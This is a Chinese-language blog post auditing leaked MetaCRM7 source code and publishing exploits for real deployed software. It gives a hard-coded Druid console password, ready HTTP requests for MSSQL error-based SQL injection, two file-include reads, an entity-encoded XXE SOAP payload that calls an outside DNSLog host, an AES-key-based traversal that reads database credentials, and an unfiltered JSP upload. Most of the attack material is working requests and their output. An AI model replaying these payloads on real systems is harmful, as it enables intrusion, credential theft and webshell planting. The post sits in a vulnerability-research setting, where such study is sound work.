有幸拿到了MetaCRM的源码，并且今年hw也爆出过很多洞了，简单看一下吧

`title: "MetaCRM7综合管理系统"`

## druid默认账号密码
看到`WEB-INF/web.xml`
```xml
  </servlet-mapping>
    <servlet>
        <servlet-name>DruidStatView</servlet-name>
        <servlet-class>com.alibaba.druid.support.http.StatViewServlet</servlet-class>
        <init-param>
			<!-- 用户名 -->
			<param-name>loginUsername</param-name>
			<param-value>druid</param-value>
		</init-param>
		<init-param>
			<!-- 密码 -->
			<param-name>loginPassword</param-name>
			<param-value>MetasoftDruid2021+-</param-value>
		</init-param>
    </servlet>
    <servlet-mapping>
        <servlet-name>DruidStatView</servlet-name>
        <url-pattern>/druid/*</url-pattern>
    </servlet-mapping>
```
![](https://i-blog.csdnimg.cn/direct/74d914f41f11450399ad115ab280708d.png)

直接进入后台，并且可以通过Session监控获取到登录的凭证


## 前台
### /headimgsave SQL注入
看到`WEB-INF/web.xml`
![](https://i-blog.csdnimg.cn/direct/4fb2c1da8c5c42f3a98f4fbd68e019ed.png)

存在ImgController这个servlet，跟进一下
![](https://i-blog.csdnimg.cn/direct/98efac1b41914a8abb399f642f93ac3c.png)

是一个很简单的传参，然后调用`com.metasoft.wxsconf.wxdb.accountdb.AccountPO#getAc`
![](https://i-blog.csdnimg.cn/direct/6226767b7e2d413f9ab9e6d5d26c9fad.png)

显而易见SQL语句进行了拼接，并且可以看到如果产生异常会out.print打印出来

由于是mssql，可以使用`1=xxx`的方法产生报错
```
POST /headimgsave HTTP/1.1
Host: xxx
Content-Length: 30
Content-Type: application/x-www-form-urlencoded

accountid=1' and+1=@@VERSION--
```
![](https://i-blog.csdnimg.cn/direct/df6044db5a2e479388a8c98fbbbc32c4.png)


### /business/common/toviewspecial.jsp文件读取
也是一个很简单的洞，看到toviewspecial.jsp
![](https://i-blog.csdnimg.cn/direct/94e256a605fc4934bfd7d5947b4e01ea.png)

如果存在传参view，那么就会调用`<jsp:include>`包含该文件
```
/business/common/toviewspecial.jsp?view=/WEB-INF/web.xml
```
![](https://i-blog.csdnimg.cn/direct/8500edf842a9416fa0e1ecfa7e3971b1.png)

可惜只能包含Tomcat目录下文件，无法穿越到系统根目录，比较鸡肋


### /business/common/download-new.jsp文件读取
![](https://i-blog.csdnimg.cn/direct/f21547bfc33048c29ec7103727020bb8.png)

也是一个十分鸡肋的文件读取
```
/business/common/download-new.jsp?filename=1&page=/WEB-INF/web.xml
```
![](https://i-blog.csdnimg.cn/direct/170ed93bf3dc450b832f7338a3299ff3.png)


### /services/ws XXE
看到`WEB-INF/web.xml`
![](https://i-blog.csdnimg.cn/direct/a56181e7ed3a497aafd2d3b4cec934b0.png)

存在CXFServlet，访问即可看到
![](https://i-blog.csdnimg.cn/direct/76e88fd714494f79b0ffd178ff8e4b1d.png)

跟进到`com.metasoft.ws.service.data.CommonOperationServImpl`，先看到commonCheckServ
![](https://i-blog.csdnimg.cn/direct/4601b0dd5bf449deb7ef9859877e047c.png)

发现使用的`DocumentUtil.getDocument4String`处理数据
![](https://i-blog.csdnimg.cn/direct/db793d492ca648bcb8c9b445f8390d51.png)

同时dom4j版本为1.6.1.jar，存在XXE漏洞

```xml
POST /services/ws HTTP/1.1
Host: xxx
SOAPAction: 
Content-Type: text/xml;charset=UTF-8

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:data="http://data.service.ws.metasoft.com/">
   <soapenv:Header/>
   <soapenv:Body>
      <data:commonCheckServ>
         <accessSessionValue>&lt;&#63;&#120;&#109;&#108;&#32;&#118;&#101;&#114;&#115;&#105;&#111;&#110;&#61;&quot;&#49;&#46;&#48;&quot;&#32;&#101;&#110;&#99;&#111;&#100;&#105;&#110;&#103;&#61;&quot;&#85;&#84;&#70;&#45;&#56;&quot;&#63;&gt;&#10;&lt;&#33;&#68;&#79;&#67;&#84;&#89;&#80;&#69;&#32;&#114;&#111;&#111;&#116;&#32;&#91;&#10;&lt;&#33;&#69;&#78;&#84;&#73;&#84;&#89;&#32;&#37;&#32;&#114;&#101;&#109;&#111;&#116;&#101;&#32;&#83;&#89;&#83;&#84;&#69;&#77;&#32;&quot;&#104;&#116;&#116;&#112;&#58;&#47;&#47;&#49;&#46;&#102;&#114;&#51;&#122;&#112;&#109;&#109;&#119;&#46;&#100;&#110;&#115;&#108;&#111;&#103;&#46;&#112;&#119;&quot;&gt;&#10;&#37;&#114;&#101;&#109;&#111;&#116;&#101;&#59;&#93;&gt;&#10;&lt;&#114;&#111;&#111;&#116;&#47;&gt;</accessSessionValue>
         <objectname>1</objectname>
         <recordid>1</recordid>
      </data:commonCheckServ>
   </soapenv:Body>
</soapenv:Envelope>
```
DNSLog成功收到请求
![](https://i-blog.csdnimg.cn/direct/0127badafa5141d1b4090eb9019972e6.png)

同理其余几个方法都存在该漏洞
往后看了下，还存在sql注入
![](https://i-blog.csdnimg.cn/direct/de45705d23e94625aff66e2a56c67ddb.png)

就不多赘述了

## 后台
### /business/common/download.jsp后台任意文件读取
![](https://i-blog.csdnimg.cn/direct/fd5bc79f1271466c873f29094581e7a9.png)

获取传参p赋值给downUrl，然后获取文件名、文件、类型，注意这里不能超时

主要是`new AnalyzeParam(downUrl)`，跟进一下
![](https://i-blog.csdnimg.cn/direct/b1105595f37b427e898b62aabc0fbdf7.png)

发现是AesEcbCipher加密，然后参数类型为json格式
```java
package com.metasoft.framework.pub.malg.aes;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import sun.misc.BASE64Decoder;
import sun.misc.BASE64Encoder;

public class AesEcbCipher {
    private static final String SECRET_KEY = "metacrmloginpass";
    private byte[] key = "metacrmloginpass".getBytes();

    public AesEcbCipher(String secretKey) {
        this.key = secretKey.getBytes();
    }

    public AesEcbCipher() {
    }

    public String Encrypt(String sSrc) {
        try {
            SecretKeySpec skeySpec = new SecretKeySpec(this.key, "AES");
            Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
            cipher.init(1, skeySpec);
            byte[] encrypted = cipher.doFinal(sSrc.getBytes("UTF-8"));
            return (new BASE64Encoder()).encode(encrypted);
        } catch (Exception var5) {
            Exception ex = var5;
            ex.printStackTrace();
            return null;
        }
    }

    public String Decrypt(String sSrc) {
        if (sSrc != null && sSrc.length() != 0) {
            try {
                SecretKeySpec skeySpec = new SecretKeySpec(this.key, "AES");
                Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
                cipher.init(2, skeySpec);
                byte[] encrypted1 = (new BASE64Decoder()).decodeBuffer(sSrc);
                byte[] original = cipher.doFinal(encrypted1);
                String originalString = new String(original, "UTF-8");
                return originalString;
            } catch (Exception var7) {
                return sSrc;
            }
        } else {
            return sSrc;
        }
    }

    public String encrypt(String sSrc) {
        try {
            SecretKeySpec skeySpec = new SecretKeySpec(this.key, "AES");
            Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
            cipher.init(1, skeySpec);
            byte[] encrypted = cipher.doFinal(sSrc.getBytes("UTF-8"));
            return Hex.encodeHexStr(encrypted);
        } catch (Exception var5) {
            Exception ex = var5;
            ex.printStackTrace();
            return null;
        }
    }

    public String decrypt(String sSrc) {
        if (sSrc != null && sSrc.length() != 0) {
            try {
                SecretKeySpec skeySpec = new SecretKeySpec(this.key, "AES");
                Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
                cipher.init(2, skeySpec);
                byte[] encrypted1 = Hex.decodeHex(sSrc.toCharArray());
                byte[] original = cipher.doFinal(encrypted1);
                String originalString = new String(original, "UTF-8");
                return originalString;
            } catch (Exception var7) {
                return sSrc;
            }
        } else {
            return sSrc;
        }
    }
}
```
这里key值为`metacrmloginpass`，我们直接调用AES加密即可
![](https://i-blog.csdnimg.cn/direct/c1e46fd0c4b245c4bd4df3795844eba9.png)

继续往后看，发现如果us为空，那么`us.getCorpName()`会产生异常，无法继续，所以这是一个**后台漏洞**，接着`String strPage=path+strFile`，调用`UserService.downloadFile`下载文件
![](https://i-blog.csdnimg.cn/direct/97cfd1ea79e74f2493cbedc0a723b4d9.png)

很明了的一个文件读取
生成poc：[https://gchq.github.io/CyberChef](https://gchq.github.io/CyberChef)
```
{"file":"../../../../env/conf/dbinfo.prop","filename":"123123","foldertype":"messageserv","time":"720000000000000000"}
```
![](https://i-blog.csdnimg.cn/direct/408e7400ab17478abf5e4779dbb0af9e.png)

成功读取到数据库账号密码
![](https://i-blog.csdnimg.cn/direct/434873544f2a47ea8eb5eecef4577b86.png)



### /develop/systparam/softlogo/upload.jsp后台任意文件上传
在更新了版本之后，`com.metasoft.framework.pub.upload.Upload`添加了黑名单机制
![](https://i-blog.csdnimg.cn/direct/8c7cef92478146298b878535d489bc43.png)

看一下configs/limit.json：
```
	'all':{
			'black':['exe','js','jsp'],
			'white':['apk','bak','doc','docx','gif','json','log','mp3','mp4','pdf','ppt','txt','xls','xlsx','xml','rar','zip','png','bmp','jpg','jpeg','tif','pcx','tga','exif','fpx','svg','psd','cdr','pcd','dxf','ufo','eps','ai','raw','WMF','webp','pptx','csv','html'],
			'max':''			
	},
```
同理`com.metasoft.framework.pub.file.FileUtil`也添加了该黑名单

全局搜索upload，还是能找到其他上传方法的，看到`/develop/systparam/softlogo/upload.jsp`
![](https://i-blog.csdnimg.cn/direct/e2c09d6421b646c4914c002a96b48f12.png)

首先就是一个鉴权，所以这是一个后台漏洞
![](https://i-blog.csdnimg.cn/direct/ad4530a1d4ff47b6bc0f7e35972d9faf.png)

看到后续文件上传的地方，很明显没有任何过滤
```
POST /develop/systparam/softlogo/upload.jsp HTTP/1.1
Host: xxxx
Cookie: JSESSIONID=F55E5CE80A9DAE7BF034D9AB98B51136
Content-Length: 1234
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary4Ntxn9hNBuXFPZjE

------WebKitFormBoundary4Ntxn9hNBuXFPZjE
Content-Disposition: form-data; name="file"; filename="aaa.jsp"
Content-Type: image/jpeg

aaaaa
------WebKitFormBoundary4Ntxn9hNBuXFPZjE--
```
![](https://i-blog.csdnimg.cn/direct/bb8121f3586948f0920d747b850d81a5.png)

这里测试一下
![](https://i-blog.csdnimg.cn/direct/dd09dd7d24684760b54d7c71307ea64b.png)

成功上传！


